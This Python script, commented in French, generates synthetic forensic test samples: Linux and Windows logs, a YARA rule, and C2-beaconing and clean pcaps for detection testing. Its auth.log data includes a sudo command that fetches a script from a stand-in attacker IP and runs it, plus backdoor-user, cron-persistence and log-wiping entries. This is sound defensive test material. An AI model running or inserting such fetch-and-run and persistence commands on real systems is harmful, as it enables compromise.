#!/usr/bin/env python3
"""gen_samples.py - genere les echantillons synthetiques de test du kit.

Produit dans tests/samples/ :
  - auth.log          : journal Linux synthetique (brute force puis succes)
  - syslog            : journal systeme synthetique (cron, purge)
  - security.jsonl    : evenements Windows synthetiques (format JSONL)
  - fake_evtx.jsonl   : alias Windows pour test de typage
  - c2.pcap           : capture reseau malveillante (DNS C2 + beaconing HTTP periodique)
  - clean.pcap        : capture reseau propre (navigation et mises a jour legitimes)

Les donnees sont 100% synthetiques (IP de documentation RFC 5737, domaines
.invalid, comptes fictifs). Les captures sont construites en python pur,
sans dependance externe (en-tetes Ethernet/IP/TCP/UDP/DNS et checksums corrects).
"""
import calendar
import json
import struct
from datetime import datetime, timedelta
from pathlib import Path

SAMPLES = Path(__file__).resolve().parent / "samples"

# IP de documentation (RFC 5737) - jamais routables
ATTAQUANT = "203.0.113.77"
VICTIME = "198.51.100.10"
ADMIN_SRC = "198.51.100.200"

BASE = datetime(2026, 8, 30, 2, 0, 0)


def ts(off):
    return (BASE + timedelta(seconds=off)).strftime("%b %d %H:%M:%S")


def gen_auth_log():
    lignes = []
    # Pattern C-L-01 : burst d'echecs puis succes (SF-L-001, SF-L-002)
    for i in range(14):
        lignes.append(
            f"{ts(i*20)} {VICTIME} sshd[4200+i]: Failed password for admin from {ATTAQUANT} port {40000+i} ssh2"
        )
    lignes.append(
        f"{ts(300)} {VICTIME} sshd[4215]: Accepted password for admin from {ATTAQUANT} port 40014 ssh2"
    )
    # Activite post-compromission (SF-L-010, SF-L-011)
    lignes.append(f"{ts(330)} {VICTIME} sudo:   admin : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/wget http://{ATTAQUANT}/st.sh -O /tmp/st.sh")
    lignes.append(f"{ts(335)} {VICTIME} sudo:   admin : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/chmod +x /tmp/st.sh")
    lignes.append(f"{ts(340)} {VICTIME} sudo:   admin : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/tmp/st.sh")
    # Persistance (SF-L-021, SF-L-020)
    lignes.append(f"{ts(360)} {VICTIME} useradd[4230]: new user: name=svcbackup, UID=1002, GID=1002, home=/home/svcbackup, shell=/bin/bash")
    lignes.append(f"{ts(370)} {VICTIME} sudo:   admin : TTY=pts/0 ; PWD=/etc ; USER=root ; COMMAND=/usr/sbin/useradd svcbackup")
    # Session legitime de controle (bruit)
    lignes.append(f"{ts(600)} {VICTIME} sshd[4300]: Accepted publickey for ops from {ADMIN_SRC} port 51000 ssh2")
    (SAMPLES / "auth.log").write_text("\n".join(lignes) + "\n")


def gen_syslog():
    lignes = []
    # Cron malveillant (SF-L-020)
    lignes.append(f"{ts(380)} {VICTIME} CRON[4240]: (root) CMD (/tmp/st.sh)")
    lignes.append(f"{ts(400)} {VICTIME} systemd[1]: Started /etc/cron.d/svcbk -- Simple Backup Service.")
    # Purge de journaux (SF-L-030)
    lignes.append(f"{ts(500)} {VICTIME} bash[4301]: /var/log/auth.log truncated by root")
    (SAMPLES / "syslog").write_text("\n".join(lignes) + "\n")


def evtx_event(event_id, channel, off, **champs):
    e = {
        "EventTime": (BASE + timedelta(seconds=off)).isoformat(),
        "Channel": channel,
        "EventID": event_id,
        "Computer": "SRV-WEB01",
    }
    e.update(champs)
    return e


def gen_security_jsonl():
    evenements = [
        # C-W-01 : execution utilisateur -> temp -> persistance -> lsass -> lateral
        evtx_event(4688, "Security", 0, SubjectUserName="jdupont", NewProcessName="C:\\Users\\jdupont\\AppData\\Local\\Temp\\invoice.exe", CommandLine="invoice.exe /quiet"),
        evtx_event(1, "Microsoft-Windows-Sysmon/Operational", 5, Image="C:\\Users\\jdupont\\AppData\\Local\\Temp\\invoice.exe", CommandLine="invoice.exe /quiet", User="CORP\\jdupont"),
        evtx_event(7045, "System", 120, ServiceName="WinDefendUpd", ServiceFileName="C:\\Windows\\Temp\\svchosts.exe", StartType="auto start"),
        evtx_event(10, "Microsoft-Windows-Sysmon/Operational", 600, SourceImage="C:\\Windows\\Temp\\svchosts.exe", TargetImage="C:\\Windows\\system32\\lsass.exe", GrantedAccess="0x1010", User="NT AUTHORITY\\SYSTEM"),
        evtx_event(7045, "System", 900, ServiceName="PSEXESVC", ServiceFileName="PSEXESVC.exe", StartType="demand start"),
        evtx_event(4624, "Security", 910, LogonType=3, TargetUserName="svc_sql", IpAddress=ADMIN_SRC),
        # Journal efface (SF-W-040)
        evtx_event(1102, "Security", 1200, SubjectUserName="jdupont"),
    ]
    (SAMPLES / "security.jsonl").write_text("\n".join(json.dumps(e) for e in evenements) + "\n")


def gen_rules_yar():
    regle = """rule kit_test_marker {
    strings:
        $marker = "KIT-DFIR-TEST-MARKER"
    condition:
        $marker
}
"""
    (SAMPLES / "rules.yar").write_text(regle)
    (SAMPLES / "testfile.bin").write_bytes(b"BASIC BINARY PADDING\nKIT-DFIR-TEST-MARKER\n")


# ---------------------------------------------------------------- pcaps ----
# Construction en python pur : pcap v2.4 (little endian), Ethernet, IPv4,
# TCP/UDP avec checksums corrects (suricata invalide les paquets mal sommes).

MAC_CLIENT = bytes.fromhex("aabbcc000001")
MAC_SERVER = bytes.fromhex("aabbcc000002")

IP_CLIENT = VICTIME          # 198.51.100.10
IP_C2 = ATTAQUANT            # 203.0.113.77
IP_DNS = "198.51.100.1"
IP_PROPRE_1 = "198.51.100.50"
IP_PROPRE_2 = "198.51.100.51"

EPOCH_BASE = calendar.timegm(BASE.timetuple())


def ip_vers_octets(ip):
    return bytes(int(p) for p in ip.split("."))


def checksum16(donnees):
    if len(donnees) % 2:
        donnees += b"\x00"
    total = 0
    for i in range(0, len(donnees), 2):
        total += (donnees[i] << 8) | donnees[i + 1]
    while total >> 16:
        total = (total & 0xFFFF) + (total >> 16)
    return (~total) & 0xFFFF


class Pcap:
    """Collecteur de trames horodatees, ecrites en ordre chronologique."""

    def __init__(self):
        self.trames = []
        self._ip_id = 40000

    def ajouter(self, ts, trame):
        self.trames.append((ts, trame))

    def ecrire(self, nom):
        self.trames.sort(key=lambda t: t[0])
        sortie = bytearray(struct.pack("<IHHiIII", 0xA1B2C3D4, 2, 4, 0, 0, 262144, 1))
        for ts, trame in self.trames:
            sec = EPOCH_BASE + int(ts)
            usec = int(round((ts - int(ts)) * 1_000_000))
            sortie += struct.pack("<IIII", sec, usec, len(trame), len(trame))
            sortie += trame
        (SAMPLES / nom).write_bytes(bytes(sortie))

    # -- couches basses ----------------------------------------------------
    def _ip(self, src, dst, proto, charge):
        self._ip_id = (self._ip_id + 1) & 0xFFFF
        total = 20 + len(charge)
        entete = struct.pack(">BBHHHBBH4s4s", 0x45, 0, total, self._ip_id,
                             0x4000, 64, proto, 0, ip_vers_octets(src), ip_vers_octets(dst))
        somme = checksum16(entete)
        entete = entete[:10] + struct.pack(">H", somme) + entete[12:]
        return entete + charge

    def _eth(self, src_ip, dst_ip, proto, charge):
        trame = MAC_CLIENT + MAC_SERVER + b"\x08\x00" + self._ip(src_ip, dst_ip, proto, charge)
        # trame retour : MAC inverses geres par les fonctions appelantes via sens
        return trame

    def _eth_retour(self, src_ip, dst_ip, proto, charge):
        return MAC_SERVER + MAC_CLIENT + b"\x08\x00" + self._ip(src_ip, dst_ip, proto, charge)

    def tcp(self, ts, sens, src_ip, dst_ip, sport, dport, seq, ack, drapeaux, charge=b""):
        entete = struct.pack(">HHIIBBHHH", sport, dport, seq, ack, 0x50, drapeaux,
                             64240, 0, 0)
        pseudo = (ip_vers_octets(src_ip) + ip_vers_octets(dst_ip) + b"\x00\x06"
                  + struct.pack(">H", len(entete) + len(charge)))
        somme = checksum16(pseudo + entete + charge) or 0xFFFF
        entete = entete[:16] + struct.pack(">H", somme) + entete[18:]
        trame = (self._eth if sens == "aller" else self._eth_retour)(src_ip, dst_ip, 6, entete + charge)
        self.ajouter(ts, trame)

    def udp(self, ts, sens, src_ip, dst_ip, sport, dport, charge):
        entete = struct.pack(">HHHH", sport, dport, 8 + len(charge), 0)
        pseudo = (ip_vers_octets(src_ip) + ip_vers_octets(dst_ip) + b"\x00\x11"
                  + struct.pack(">H", 8 + len(charge)))
        somme = checksum16(pseudo + entete + charge) or 0xFFFF
        entete = entete[:6] + struct.pack(">H", somme)
        trame = (self._eth if sens == "aller" else self._eth_retour)(src_ip, dst_ip, 17, entete + charge)
        self.ajouter(ts, trame)


def dns_message(qid, nom, reponse_ip=None):
    """Requete (ou reponse A) DNS pour un nom de domaine."""
    labels = b"".join(bytes([len(p)]) + p.encode() for p in nom.split(".")) + b"\x00"
    question = labels + struct.pack(">HH", 1, 1)
    if reponse_ip is None:
        return struct.pack(">HHHHHH", qid, 0x0100, 1, 0, 0, 0) + question
    reponse = (struct.pack(">HHHHHH", qid, 0x8180, 1, 1, 0, 0) + question
               + b"\xc0\x0c" + struct.pack(">HHIH", 1, 1, 300, 4) + ip_vers_octets(reponse_ip))
    return reponse


def echange_dns(pcap, ts, qid, nom, reponse_ip):
    sport = 40000 + (qid % 20000)
    pcap.udp(ts, "aller", IP_CLIENT, IP_DNS, sport, 53, dns_message(qid, nom))
    pcap.udp(ts + 0.02, "retour", IP_DNS, IP_CLIENT, 53, sport, dns_message(qid, nom, reponse_ip))


def http_requete(host, chemin, ua):
    return (f"GET {chemin} HTTP/1.1\r\nHost: {host}\r\n"
            f"User-Agent: {ua}\r\nAccept: */*\r\nConnection: close\r\n\r\n").encode()


def http_reponse(corps=b"ok\n"):
    return (b"HTTP/1.1 200 OK\r\nServer: nginx\r\nContent-Type: text/plain\r\n"
            + f"Content-Length: {len(corps)}\r\nConnection: close\r\n\r\n".encode() + corps)


def session_http(pcap, ts, srv_ip, sport, host, chemin, ua, corps=b"ok\n"):
    """Connexion TCP complete : handshake, requete client, reponse serveur, fermeture."""
    requete, reponse = http_requete(host, chemin, ua), http_reponse(corps)
    seq_c, seq_s = 1000 + (sport % 1000), 5000
    pcap.tcp(ts + 0.00, "aller", IP_CLIENT, srv_ip, sport, 80, seq_c, 0, 0x02)
    pcap.tcp(ts + 0.01, "retour", srv_ip, IP_CLIENT, 80, sport, seq_s, seq_c + 1, 0x12)
    pcap.tcp(ts + 0.02, "aller", IP_CLIENT, srv_ip, sport, 80, seq_c + 1, seq_s + 1, 0x10)
    pcap.tcp(ts + 0.03, "aller", IP_CLIENT, srv_ip, sport, 80, seq_c + 1, seq_s + 1, 0x18, requete)
    pcap.tcp(ts + 0.04, "retour", srv_ip, IP_CLIENT, 80, sport, seq_s + 1, seq_c + 1 + len(requete), 0x10)
    pcap.tcp(ts + 0.05, "retour", srv_ip, IP_CLIENT, 80, sport, seq_s + 1, seq_c + 1 + len(requete), 0x18, reponse)
    fin_c = seq_c + 1 + len(requete)
    fin_s = seq_s + 1 + len(reponse)
    pcap.tcp(ts + 0.06, "aller", IP_CLIENT, srv_ip, sport, 80, fin_c, fin_s, 0x10)
    pcap.tcp(ts + 0.07, "aller", IP_CLIENT, srv_ip, sport, 80, fin_c, fin_s, 0x11)
    pcap.tcp(ts + 0.08, "retour", srv_ip, IP_CLIENT, 80, sport, fin_s, fin_c + 1, 0x10)
    pcap.tcp(ts + 0.09, "retour", srv_ip, IP_CLIENT, 80, sport, fin_s, fin_c + 1, 0x11)
    pcap.tcp(ts + 0.10, "aller", IP_CLIENT, srv_ip, sport, 80, fin_c + 1, fin_s + 1, 0x10)


UA_BOT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
UA_NAV = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"


def gen_c2_pcap():
    """c2.pcap - chaine C2 synthetique : resolution DNS puis beaconing HTTP periodique
    (chaines SF-R-002 et SF-R-001, alertes KIT-TEST sids 1000001/1000002)."""
    pcap = Pcap()
    echange_dns(pcap, 0.0, 4242, "c2.kit-test.invalid", IP_C2)
    for i in range(8):
        ts = 60.0 * (i + 1)
        session_http(pcap, ts, IP_C2, 41000 + i, "beacon.kit-test.invalid", "/gate.php", UA_BOT)
    pcap.ecrire("c2.pcap")


def gen_clean_pcap():
    """clean.pcap - trafic legitime : navigation et mises a jour, intervalles irreguliers.
    Aucune regle kit ne doit s'y declencher (test de bruit de l'E2E)."""
    pcap = Pcap()
    echange_dns(pcap, 0.0, 1001, "www.example.org", IP_PROPRE_1)
    echange_dns(pcap, 3.0, 1002, "update.example.net", IP_PROPRE_2)
    session_http(pcap, 4.0, IP_PROPRE_1, 42000, "www.example.org", "/", UA_NAV,
                 corps=b"<html><body>page d'exemple</body></html>\n")
    session_http(pcap, 7.0, IP_PROPRE_2, 42001, "update.example.net", "/updates/2026.pack", UA_NAV,
                 corps=b"\x00\x01\x02\x03paquet de mise a jour synthetique")
    echange_dns(pcap, 30.0, 1003, "cdn.example.net", IP_PROPRE_1)
    session_http(pcap, 35.0, IP_PROPRE_1, 42002, "cdn.example.net", "/static/app.js", UA_NAV,
                 corps=b"// contenu statique synthetique\n")
    session_http(pcap, 120.0, IP_PROPRE_2, 42003, "update.example.net", "/updates/2026.pack", UA_NAV,
                 corps=b"\x00\x01\x02\x03paquet de mise a jour synthetique")
    echange_dns(pcap, 190.0, 1004, "mail.example.org", IP_PROPRE_2)
    pcap.ecrire("clean.pcap")


if __name__ == "__main__":
    SAMPLES.mkdir(parents=True, exist_ok=True)
    gen_auth_log()
    gen_syslog()
    gen_security_jsonl()
    gen_rules_yar()
    gen_c2_pcap()
    gen_clean_pcap()
    print(f"Echantillons generes dans {SAMPLES}")
    for f in sorted(SAMPLES.iterdir()):
        print(f"  - {f.name} ({f.stat().st_size} octets)")
